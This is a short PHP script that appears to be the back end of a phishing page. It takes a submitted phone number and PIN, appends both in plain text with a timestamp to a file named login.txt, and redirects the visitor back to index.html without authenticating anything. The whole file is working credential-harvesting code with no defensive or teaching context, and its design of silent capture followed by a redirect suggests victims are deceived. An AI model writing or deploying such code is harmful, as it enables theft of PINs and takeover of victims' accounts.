<?php

// Check if both phone number and PIN data have been sent
if (isset($_POST['phone_number']) && isset($_POST['pin'])) {

    // Get the data
    $phone = $_POST['phone_number'];
    $pin = $_POST['pin'];
    $file = 'login.txt'; // The name of the file to save to

    // Get current date and time
    $date = date('Y-m-d H:i:s');
    
    // Format the data to be written
    $data = "==============================\n";
    $data .= "Date:   " . $date . "\n";
    $data .= "Phone:  " . $phone . "\n";
    $data .= "PIN:    " . $pin . "\n";
    $data .= "==============================\n\n";

    // Write the data to the file
    // FILE_APPEND ensures new data is added to the end, not overwriting old data
    // LOCK_EX prevents others from writing to the file at the same time
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
}

// Redirect the user back to the first page (index.html)
header('Location: index.html');
exit;

?>
